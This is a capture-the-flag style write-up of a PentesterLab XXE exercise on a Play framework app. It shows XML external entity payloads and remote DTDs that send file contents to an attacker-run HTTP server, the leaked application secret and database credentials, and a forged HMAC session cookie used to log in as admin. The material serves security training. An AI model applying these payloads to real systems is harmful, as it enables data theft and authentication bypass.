#### 2.1. About exercise

URL: `https://pentesterlab.com/exercises/play_xxe`

The goal of the lab exercise is to retrieve the cookie signature key from the app's config, and then generate a valid cookie to authenticate as `admin`.

Also, the challenge requires disclosure of all routes to reach the (secret) URL, which may be a protected/internal resources.

Download the ISO for VMWare:
```
$ wget https://pentesterlab.com/exercises/play_xxe/iso
```

#### 2.2. App routes in Play framework

Documentation:
- `https://www.playframework.com/documentation/1.2/routes`
- Files: 
  - `conf/routes`
  - `conf/application.conf`


#### 2.3. Basic detection

Local sever for entity HTTP request:
```
$ python -m http.server 8888
```

Test 1:
```
$ cat req1.xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [
	<!ENTITY call SYSTEM "http://192.168.209.146:8888/XXE">
]>
<test>&call;</test>
$ http POST 192.168.209.136/login @req1.xml Content-Type:text/xml >/dev/null
```
Logs on sever:
```
192.168.209.136 - - [NOLOGS] code 404, message File not found
192.168.209.136 - - [NOLOGS] "GET /XXE HTTP/1.1" 404 -
```

Test 2:
```
$ cat req2.xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://192.168.209.146:8888/XXE">
$ http POST 192.168.209.136/login @req2.xml Content-Type:text/xml >/dev/null
```
Logs on sever:
```
192.168.209.136 - - [NOLOGS] code 404, message File not found
192.168.209.136 - - [NOLOGS] "GET /XXE HTTP/1.1" 404 -
```

Test 3:
```
$ cat req3.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///opt">]>
<foo>&xxe;</foo>
$ http POST 192.168.209.136/login @req3.xml Content-Type:text/xml -v
```
Note: no errors while reading `/` (dir listing)

Test 4:
```
$ cat req4.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///lol">]>
<foo>&xxe;</foo>
$ http POST 192.168.209.136/login @req4.xml Content-Type:text/xml
```
Note: `/lol` should not exist; response is `For request 'POST /login' [Invalid XML]`


#### 2.4. Listing root directory via XXE

Remote DTD file to be served:
```
$ cat /tmp/dtd
<!ENTITY % f SYSTEM "file:///">
<!ENTITY % all "<!ENTITY trigger SYSTEM 'http://192.168.209.146:8888/?%f;'>">
%all;
```

Run with remote DTD:
```
$ cat req5.xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://192.168.209.146:8888/dtd">
<x>&trigger;</x>
$ http POST 192.168.209.136/login @req5.xml Content-Type:text/xml >/dev/null
```

Logs on sever:
```
192.168.209.136 - - [NOLOGS] "GET /dtd HTTP/1.1" 200 -
192.168.209.136 - - [NOLOGS] "GET /?bin%0Aboot%0Adev%0Aetc%0Ahome%0Ainit%0Alib%0Alinuxrc%0Amnt%0Aopt%0Aproc%0Aroot%0Arun%0Asbin%0Asys%0Atmp%0Ausr%0Avar%0A HTTP/1.1" 200 -
```

#### 2.5. Reading the sensitive data

a) DTD file for reading the `application.conf` file:
```
<!ENTITY % f SYSTEM "file:///opt/play-2.1.3/xxe/conf/application.conf">
<!ENTITY % all "<!ENTITY trigger SYSTEM 'http://192.168.209.146:8888/?%f;'>">
%all;
```

b) DTD file for reading the `routes` file:
```
<!ENTITY % f SYSTEM "file:///opt/play-2.1.3/xxe/conf/routes">
<!ENTITY % all "<!ENTITY trigger SYSTEM 'http://192.168.209.146:8888/?%f;'>">
%all;
```


#### 2.4 HTTP logs

a) Contents of `/opt/play-2.1.3/xxe/conf/application.conf` (URL decoded and formatted):
```
192.168.209.136 - - [NOLOGS] "GET /dtd HTTP/1.1" 200 -
192.168.209.136 - - [0NOLOGS] "GET /?
application.secret="X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG"
application.langs="en"
db.default.driver=com.mysql.jdbc.Driver
db.default.url="mysql://pentesterlab:pentesterlab@localhost/xxe"
ebean.default="models.*"
logger.root=ERROR
logger.play=INFO
logger.application=DEBUG
HTTP/1.1" 200 -
```

b) Contents of `/opt/play-2.1.3/xxe/conf/routes` (URL decoded and formatted):
```
192.168.209.136 - - [NOLOGS] "GET /dtd HTTP/1.1" 200 -
192.168.209.136 - - [NOLOGS] "GET /?
GET     /                           controllers.Application.index()
GET     /0ecf87346b9c0b370f8d63e6e7fed4f0             controllers.Application.secret_url()
GET       /login                   controllers.Application.login
POST      /login                   controllers.Application.login
GET       /logout                  controllers.Application.logout
GET     /assets/*file               controllers.Assets.at(path="/public", file) 
HTTP/1.1" 200 -
```

To reach the secret page:
```
# http http://192.168.209.136/0ecf87346b9c0b370f8d63e6e7fed4f0 -b
```

#### 2.5. Authentication bypass

Generic cookie format:
```
Cookie: PLAY_SESSION="[signature_goes_here]-user=admin"
```

To sign a valid cookie using `application.secret`:
```
# echo -n 'user=admin' | openssl dgst -sha1 -hmac 'X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG'
(stdin)= a5b8363ce748cfbb5d654edc3676d440173b33de
```

Final cookie:
```
Cookie: PLAY_SESSION="a5b8363ce748cfbb5d654edc3676d440173b33de-user=admin"
```

Gaining access as `admin` user:
```
# http http://192.168.209.136/ Cookie:PLAY_SESSION="a5b8363ce748cfbb5d654edc3676d440173b33de-user=admin" -v
```
